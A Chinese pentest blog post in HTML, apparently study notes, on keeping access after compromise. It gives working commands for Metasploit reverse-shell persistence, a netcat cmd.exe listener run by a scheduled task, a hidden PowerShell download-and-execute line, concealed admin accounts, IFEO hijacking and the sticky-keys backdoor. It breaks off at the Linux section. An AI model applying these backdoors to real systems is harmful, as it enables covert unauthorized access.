@@ -1,0 +1,1432 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="渗透,权限维持,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Blog of 1ypt0" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/lypto.ico?v=5.1.1">
+
+
+
+
+
+
+<meta name="description" content="这是一篇介绍渗透测试后阶段权限维持的文章，里面包括了当今服务器的两大主流操作系统linux和windows的相关维权技术。所有维权手段中，最为通用的莫过于计划任务，所以本篇有较大篇幅科普了windows和linux的计划任务。技术也不是最新的，本着学习思路把前辈的方法做个摘录。">
+<meta name="keywords" content="渗透,权限维持">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限维持杂谈">
+<meta property="og:url" content="http://lypto.me/2019/02/26/权限维持杂谈/index.html">
+<meta property="og:site_name" content="Blog of 1ypt0">
+<meta property="og:description" content="这是一篇介绍渗透测试后阶段权限维持的文章，里面包括了当今服务器的两大主流操作系统linux和windows的相关维权技术。所有维权手段中，最为通用的莫过于计划任务，所以本篇有较大篇幅科普了windows和linux的计划任务。技术也不是最新的，本着学习思路把前辈的方法做个摘录。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://lypto.me/myimages/后门/index.jpg">
+<meta property="og:image" content="http://lypto.me/myimages/后门/FZEgSbC.PNG">
+<meta property="og:image" content="http://lypto.me/myimages/后门/sam权限.png">
+<meta property="og:image" content="http://lypto.me/myimages/后门/sam.PNG">
+<meta property="og:image" content="http://lypto.me/myimages/后门/开机自启动.PNG">
+<meta property="og:image" content="http://lypto.me/myimages/后门/IEFO.PNG">
+<meta property="og:image" content="http://lypto.me/myimages/后门/sethc.PNG">
+<meta property="og:image" content="http://lypto.me/myimages/后门/cmd.PNG">
+<meta property="og:image" content="http://lypto.me/myimages/后门/bashrc.PNG">
+<meta property="og:image" content="http://lypto.me/myimages/后门/ncshell.PNG">
+<meta property="og:updated_time" content="2019-02-26T07:25:16.769Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="权限维持杂谈">
+<meta name="twitter:description" content="这是一篇介绍渗透测试后阶段权限维持的文章，里面包括了当今服务器的两大主流操作系统linux和windows的相关维权技术。所有维权手段中，最为通用的莫过于计划任务，所以本篇有较大篇幅科普了windows和linux的计划任务。技术也不是最新的，本着学习思路把前辈的方法做个摘录。">
+<meta name="twitter:image" content="http://lypto.me/myimages/后门/index.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":0,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://lypto.me/2019/02/26/权限维持杂谈/">
+
+
+
+
+
+  <title>权限维持杂谈 | Blog of 1ypt0</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?47d7b880e7f466d86f6a2755e80a6337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+	<a href="https://github.com/IversionBY"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Blog of 1ypt0</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://lypto.me/2019/02/26/权限维持杂谈/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="1ypt0">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/109.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of 1ypt0">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">权限维持杂谈</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-26T15:19:21+08:00">
+                Feb 26 2019
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/02/26/权限维持杂谈/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/02/26/权限维持杂谈/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  3.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  13
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img style="margin: auto;" src="/myimages/后门/index.jpg" height="450" width="450"></p>
+<blockquote>
+<p>这是一篇介绍渗透测试后阶段权限维持的文章，里面包括了当今服务器的两大主流操作系统linux和windows的相关维权技术。所有维权手段中，最为通用的莫过于计划任务，所以本篇有较大篇幅科普了windows和linux的计划任务。技术也不是最新的，本着学习思路把前辈的方法做个摘录。</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="0x01-MSF"><a href="#0x01-MSF" class="headerlink" title="0x01 MSF"></a>0x01 MSF</h1><h2 id="persistence"><a href="#persistence" class="headerlink" title="persistence"></a>persistence</h2><blockquote>
+<p>msf内置的后渗透权限维持工具persistence，参考[3]盗得一图</p>
+</blockquote>
+<p><img src="/myimages/后门/FZEgSbC.PNG" alt="image"></p>
+<h2 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h2><p>它是通过在已经获得shell的目标主机上开启了一个服务来提供后门的功能。<br><code>run Metsvc -h</code></p>
+<h2 id="Scheduleme-amp-Schtasksabuse"><a href="#Scheduleme-amp-Schtasksabuse" class="headerlink" title="Scheduleme &amp; Schtasksabuse"></a>Scheduleme &amp; Schtasksabuse</h2><p>msf中自动利用计划任务的后门程序，后面会聊到linux和windows平台的计划任务。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">run scheduleme -h</span><br><span class="line"># 例子：上传nc并创建计划任务每一分钟执行一次 &apos;nc -e cmd.exe -L -p 8080&apos;</span><br><span class="line">run scheduleme -m 1 -e /tmp/nc.exe -o &quot;-e cmd.exe -L -p 8080&quot; </span><br><span class="line"></span><br><span class="line">run Schtasksabuse -h</span><br><span class="line"># 例子：每隔4秒执行一次calc.exe </span><br><span class="line">run schtasksabuse -t 192.168.2.7 -c &quot;cmd /c calc.exe&quot; -d 4</span><br></pre></td></tr></table></figure></p>
+<h2 id="Mof-ps-persist"><a href="#Mof-ps-persist" class="headerlink" title="Mof_ps_persist"></a>Mof_ps_persist</h2><blockquote>
+<p>现在已经找不到这个利用模块，参考：<a href="https://github.com/khr0x40sh/metasploit-modules/blob/master/persistence/mof_ps_persist.rb" target="_blank" rel="noopener">https://github.com/khr0x40sh/metasploit-modules/blob/master/persistence/mof_ps_persist.rb</a></p>
+</blockquote>
+<h2 id="Autorunscript"><a href="#Autorunscript" class="headerlink" title="Autorunscript"></a>Autorunscript</h2><p>获取shell的时候自动执行持续化脚本,可以被Autorunscript执行的命令目录在<code>metasploit/scripts/meterpreter</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># persistence</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.2.101</span><br><span class="line">set LPORT 5555</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set AutoRunScript persistence -r 192.168.2.101 -p 5556 -U -X -i 30</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line"># metsvc</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.2.101</span><br><span class="line">set LPORT 5555</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set AutoRunScript metsvc -A</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
+<h1 id="0x02-计划任务"><a href="#0x02-计划任务" class="headerlink" title="0x02 计划任务"></a>0x02 计划任务</h1><p>无论是windows还是linux操作系统都提供计划任务功能，来实现定时或者周期性的执行一些指令。自然而然我们可以在计划任务中做手脚，埋后门。</p>
+<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><ul>
+<li>图形化工具：taskschd.msc</li>
+<li>命令行工具：schtasks.exe<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">SCHTASKS /parameter [arguments]</span><br><span class="line"></span><br><span class="line">描述:</span><br><span class="line">    允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任</span><br><span class="line">    务。</span><br><span class="line"></span><br><span class="line">参数列表:</span><br><span class="line">    /Create         创建新计划任务。</span><br><span class="line"></span><br><span class="line">    /Delete         删除计划任务。</span><br><span class="line"></span><br><span class="line">    /Query          显示所有计划任务。</span><br><span class="line"></span><br><span class="line">    /Change         更改计划任务属性。</span><br><span class="line"></span><br><span class="line">    /Run            按需运行计划任务。</span><br><span class="line"></span><br><span class="line">    /End            中止当前正在运行的计划任务。</span><br><span class="line"></span><br><span class="line">    /ShowSid        显示与计划的任务名称相应的安全标识符。</span><br><span class="line"></span><br><span class="line">    /?              显示此帮助消息。</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">    SCHTASKS</span><br><span class="line">    SCHTASKS /?</span><br><span class="line">    SCHTASKS /Run /?</span><br><span class="line">    SCHTASKS /End /?</span><br><span class="line">    SCHTASKS /Create /?</span><br><span class="line">    SCHTASKS /Delete /?</span><br><span class="line">    SCHTASKS /Query  /?</span><br><span class="line">    SCHTASKS /Change /?</span><br><span class="line">    SCHTASKS /ShowSid /?</span><br><span class="line">Payload examples:</span><br><span class="line">    SCHTASKS /Create /TN update /TR xx(待执行的命令)  /DELAY ONLOGON /F /RL HIGHEST</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><ul>
+<li>一次性执行任务：at命令———&gt;atd进程</li>
+<li>周期性执行任务：crontab命令———&gt;crond进程</li>
+</ul>
+<blockquote>
+<p>在实际的渗透过程中我们更倾向于使用crontab</p>
+</blockquote>
+<h3 id="at"><a href="#at" class="headerlink" title="at"></a>at</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">- 1.服务开启</span><br><span class="line">service atd start</span><br><span class="line"></span><br><span class="line">- 2.基本格式</span><br><span class="line">at  [HH:MM]  [yyyy-mm-dd]  #没有指定年月日的，默认是当天的。</span><br><span class="line"></span><br><span class="line">- 3.查询当前设置的at任务列表</span><br><span class="line">atq　　#或at -l</span><br><span class="line"></span><br><span class="line">- 4.删除指定任务编号的at任务</span><br><span class="line">atrm 编号　　#或at -d</span><br><span class="line"></span><br><span class="line">- 5.查看计划任务的具体内容</span><br><span class="line">at -c 任务号</span><br><span class="line"></span><br><span class="line">- 6.使用文件中的命令作为计划任务（比较少用）</span><br><span class="line">at 时间 -f 文件</span><br><span class="line"></span><br><span class="line">- 7.相关文件</span><br><span class="line">/etc/at.deny：#该名单里面的人不可以使用</span><br><span class="line">/etc/at.allow：#只有该名单里面的人可以使用</span><br></pre></td></tr></table></figure>
+<h3 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h3><blockquote>
+<p>注意：<br>（1）crontab 只会在/sbin、/bin、/usr/sbin、/usr/bin下查找命令，如果命令不在这些目录中，应该要使用绝对路径。<br>（2）只有root用户可以管理其他用户的周期性任务<br>（3）crontab在重启后之前的周期性任务无效，anacron可以弥补crontab的缺陷。配置文件：/etc/anacrontab。anacrontab会开机自动检查没有执行的计划任务，然乎逐一执行，这个过程是用户透明的。一般而言，crontab就已经可以满足基本的需求。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">- 1.服务开启</span><br><span class="line"> service crond start</span><br><span class="line"></span><br><span class="line">- 2.编辑计划任务</span><br><span class="line">crontab  -e  -u  用户名</span><br><span class="line"></span><br><span class="line">- 3.查看计划任务</span><br><span class="line">crontab  -l  -u  用户名</span><br><span class="line"></span><br><span class="line">- 4.删除计划任务：</span><br><span class="line">crontab  -r  -u  用户名</span><br><span class="line"></span><br><span class="line">- 相关文件</span><br><span class="line">/var/spool/cron/用户名  #用户定义的设置</span><br><span class="line">/var/log/cron           #cron服务的日志文件</span><br><span class="line">/etc/crontab            #cron服务配置文件：</span><br></pre></td></tr></table></figure>
+<h3 id="anacron"><a href="#anacron" class="headerlink" title="anacron"></a>anacron</h3><p>anacron是一个不同于crontab的任务，其只精确到天，用来弥补服务器在宕机下crond调度不周以及缓解计划任务执行过于集中的问题。它需要记录上次执行的时间，并更新到相应的/var/spool/anacron目录下，下次执行的时候会将当前时间和上次记录的时间进行对比，如果满足大于/etc/anacron的配置的天数就会立即执行相应的命令，然后刷新时间。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">anacron 命令行参数：</span><br><span class="line"></span><br><span class="line">-t 配置文件路径</span><br><span class="line">让anacron从指定配置文件中读取配置，常用于普通用户来管理个人任务</span><br><span class="line">-S spooldir</span><br><span class="line">设定新的spool目录来记录任务执行的时间戳，常用于普通用户来管理个人任务</span><br><span class="line">-T</span><br><span class="line">测试配置文件是否正确</span><br><span class="line">-f</span><br><span class="line">强制执行所有的任务，而不管之前的执行日期是否超过轮回天数</span><br><span class="line">-u</span><br><span class="line">将所有任务的执行日期都更新为当前日期，而不真正的执行任务</span><br><span class="line">-s</span><br><span class="line">串行地执行任务，只有前一个任务完成后才开始下一个任务</span><br></pre></td></tr></table></figure></p>
+<h1 id="0x03-windows权限维持"><a href="#0x03-windows权限维持" class="headerlink" title="0x03 windows权限维持"></a>0x03 windows权限维持</h1><h2 id="影子账户"><a href="#影子账户" class="headerlink" title="影子账户"></a>影子账户</h2><p>创建一个无法用用户本机用户罗列工具显示的用户，并且赋予管理员权限。所有操作需要有管理员权限。同时测试在windows server 2012服务器域环境下影子账户无法直接进行添加。</p>
+<ol>
+<li><p>用’$’创建匿名用户，并归到administratorsa用户组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user admin$ Test1 /add</span><br><span class="line">net localgroup administrators admin$ /add</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>导出匿名用户对应的sam目录下的注册表键值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regedt32.exe 打开 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users键值，导出Names下用户目录以及对应的16进制目录。注意需要给Administrator用户赋予Sam键值权限，默认是不允许的。</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="/myimages/后门/sam权限.png" alt="image"></p>
+<p><img src="/myimages/后门/sam.PNG" alt="image"></p>
+<ol>
+<li>删除匿名用户，双击导出的注册表文件，用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里面有用户记录，其他地方都不存在用户的信息。<code>net user</code>或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user admin$ /del</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="PowerShell后门"><a href="#PowerShell后门" class="headerlink" title="PowerShell后门"></a>PowerShell后门</h2><h3 id="Empire框架"><a href="#Empire框架" class="headerlink" title="Empire框架"></a>Empire框架</h3><blockquote>
+<p><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></p>
+</blockquote>
+<h3 id="Schtasks-Backdoor"><a href="#Schtasks-Backdoor" class="headerlink" title="Schtasks-Backdoor"></a>Schtasks-Backdoor</h3><blockquote>
+<p><a href="https://github.com/re4lity/Schtasks-Backdoor" target="_blank" rel="noopener">https://github.com/re4lity/Schtasks-Backdoor</a></p>
+</blockquote>
+<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"></span><br><span class="line">- 设置好参数后的powershell例子：</span><br><span class="line">powershell.exe  -ExecutionPolicy Bypass -nop -w hidden -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $V.downloadstring(&apos;http://192.168.80.155:8888/&apos;);</span><br></pre></td></tr></table></figure>
+<h2 id="注册表开机启动"><a href="#注册表开机启动" class="headerlink" title="注册表开机启动"></a>注册表开机启动</h2><p>在如下的注册表目录下注入键值<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>，可以实现开机自启动。以windows defender为例:  </p>
+<p><img src="/myimages/后门/开机自启动.PNG" alt="image"></p>
+<h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><blockquote>
+<p>细节参考：<a href="https://www.anquanke.com/post/id/151425" target="_blank" rel="noopener">https://www.anquanke.com/post/id/151425</a></p>
+</blockquote>
+<p>涉及到的注册表项为IFEO（Image File Execution Options），默认是只有管理员和local system有权读写修改。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options”</span><br></pre></td></tr></table></figure></p>
+<p>大致的原理如下：当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就可以正常运行。）会执行相关的选项参数，这里我们主要利用的参数是<code>debugger</code>,通过该参数我们可以实现偷梁换柱。下面以修改IE启动程序为例，实现运行IE程序但是启动的却是计算器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 找到注册表“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options”目录下的iexplore.exe</span><br><span class="line"></span><br><span class="line">2. 添加一个debugger字符串键值，并且赋值为calc.exe的执行路径，“C:\Windows\system32\calc.exe”</span><br><span class="line"></span><br><span class="line">3. 运行 iexplore.exe,bomb!!!</span><br></pre></td></tr></table></figure></p>
+<p>当然我们也可以在第一步新键一个注册表文件目录，取名为想要覆盖的可执行程序，后续步骤类似。</p>
+<p><img src="/myimages/后门/IEFO.PNG" alt="image"></p>
+<p>但是这样明目张胆的偷梁换柱有点张扬，根据安全客那篇文章，修改另外两个注册表键值可以实现原程序退出后静默运行后门程序。以执行notepad为例，退出后静默运行calc.exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /t REG_SZ /d  &quot;C:\Windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="shift后门"><a href="#shift后门" class="headerlink" title="shift后门"></a>shift后门</h2><p>这个后门的方式比较老，在windows登陆的时候按五次shift打开cmd进行操作。前提条件是:在将C盘windows目录下面的system32文件夹可写的情况下，将里面的sethc.exe应用程序进行转移，并生成sethc.exe.bak文件。并将cmd.exe拷贝覆盖sethc.exe。</p>
+<p>但是在windows xp过后，sethc组件属于完全受信用的用户TrustInstall，我们无法修改名字，这时候即使administrators都只有名义上的只读和可执行权，我们可以手动修改其所属为administrators，步骤如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">右键属性/安全/高级；</span><br><span class="line">所有者/编辑/添加当前用户/应用/确定；</span><br><span class="line">关闭窗口；</span><br><span class="line">右键属性/安全/编辑；</span><br><span class="line">选择Administrators（或者你的当前组）/勾选完全控制/确定；</span><br></pre></td></tr></table></figure></p>
+<p><img src="/myimages/后门/sethc.PNG" alt="image"></p>
+<p><img src="/myimages/后门/cmd.PNG" alt="image"></p>
+<h1 id="0x04-linux权限维持"><a href="#0x04-linux权限维持" class="headerlink" title="0x04 linux权限维持"></a>0x04 linux权限维持</h1><p>可以看到windows的权限维持很多时候是基于注册表值，但是linux里面没有注册表项，但是有很多的配置文件选项，可以达到相似的功能。下面介绍一些比较实用的后门手段。</p>
